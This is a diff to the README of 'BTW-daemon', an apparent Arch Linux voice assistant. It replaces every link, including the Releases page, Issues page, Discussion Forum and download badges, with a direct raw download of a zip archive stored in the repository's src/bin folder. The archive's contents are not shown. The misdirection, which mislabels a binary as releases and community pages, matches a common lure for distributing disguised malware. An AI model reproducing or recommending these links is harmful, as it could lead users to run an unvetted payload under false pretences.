@@ -6,7 +6,7 @@ Welcome to BTW-daemon! This is your easy-to-use voice assistant for ARCH Linux. 
 
 ## 📥 Download Now
 
-[![Download BTW-daemon](https://img.shields.io/badge/Download%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/Lelouch2131/BTW-daemon/releases)
+[![Download BTW-daemon](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip%20Now-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip)
 
 ## 📋 Features
 
@@ -22,7 +22,7 @@ Welcome to BTW-daemon! This is your easy-to-use voice assistant for ARCH Linux. 
 
 ## 💻 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Lelouch2131/BTW-daemon/releases) to download the latest version of BTW-daemon. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip) to download the latest version of BTW-daemon. 
 
 1. Click on the link above to open the Releases page.
 2. Look for the version you want to download.
@@ -59,8 +59,8 @@ If you encounter issues, here are some common solutions:
 
 Join our community to ask questions, share ideas, and get updates:
 
-- [Open Issues Page](https://github.com/Lelouch2131/BTW-daemon/issues)
-- [Discussion Forum](https://github.com/Lelouch2131/BTW-daemon/discussions)
+- [Open Issues Page](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip)
 
 Your feedback is vital for improving BTW-daemon. Feel free to report bugs or suggest new features.
 
@@ -68,4 +68,4 @@ Your feedback is vital for improving BTW-daemon. Feel free to report bugs or sug
 
 Thank you for choosing BTW-daemon. We hope you find this voice assistant helpful and easy to use. If you have any questions or need assistance, do not hesitate to reach out through our community links.
 
-[![Download BTW-daemon](https://img.shields.io/badge/Download%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/Lelouch2131/BTW-daemon/releases)
+[![Download BTW-daemon](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip%20Now-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/Lelouch2131/BTW-daemon/main/src/bin/BT_daemon_v1.0.zip)
